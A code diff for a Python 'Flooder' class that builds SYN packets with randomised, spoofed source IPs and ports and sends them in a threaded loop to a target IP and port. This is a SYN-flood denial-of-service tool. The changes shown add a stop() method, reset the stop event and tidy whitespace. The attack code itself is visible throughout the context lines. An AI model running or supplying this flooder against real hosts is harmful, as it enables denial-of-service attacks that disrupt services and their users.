@@ -5,10 +5,9 @@ class Flooder:
     def __init__(self, dest_ip, dest_port):
         self.dest_ip = dest_ip
         self.dest_port = dest_port
-
         self.packet = self.create_syn_packet()
-
         self.stop_event = threading.Event()
+
 
     def create_syn_packet(self):
         # Generate random source ip and port
@@ -22,15 +21,24 @@ class Flooder:
         # Stack the layers
         return ip / tcp / raw
     
+    
     def flood(self):
         while not self.stop_event.is_set():
             send(self.packet, verbose=0)
+        
+        # Reset stopping trigger
+        self.stop_event.clear()
+
 
     def start(self):
         t = threading.Thread(target=self.flood)
         t.start()
 
+    def stop(self):
+        self.stop_event.set()
 
+    # def __del__(self):
+    #     print('i was garbage collected!')
 
 
 
